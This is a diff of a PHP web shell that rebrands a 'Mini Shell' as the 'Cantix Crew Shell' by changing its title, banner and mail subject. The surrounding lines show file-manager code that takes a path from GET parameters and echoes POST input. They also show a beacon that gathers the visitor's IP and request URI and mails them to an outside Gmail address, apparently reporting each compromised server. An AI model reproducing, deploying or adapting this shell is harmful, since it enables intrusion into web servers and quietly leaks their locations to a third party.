@@ -5,7 +5,7 @@
 <html>
 <head>
 <link href="" rel="stylesheet" type="text/css">
-<title></title>
+<title>Cantix Crew Shell</title>
 <style>
 body{
 font-family: Iceland;
@@ -85,7 +85,7 @@ border-radius:5px;
 color:white;
 text-shadow: 0px 0px 20px #00ffff , 0px 0px 20px #00ffff;
 font-family:Iceland;
-"> P e m b u r u - K e r a n g </font></center>
+"> C a n t i x C r e w</font></center>
 <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td><font color="white">Path :</font> ';
  if(isset($_GET['path'])){ $path = $_GET['path'];
@@ -215,7 +215,7 @@ New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'
 </body>
 </html>';
 $ip = getenv("REMOTE_ADDR");
-$subj98 = "Mini Shell";
+$subj98 = "Shell Cantix";
 $email = "alexarex4@gmail.com";
 $from = "From: web";
 $a45 = $_SERVER['REQUEST_URI'];
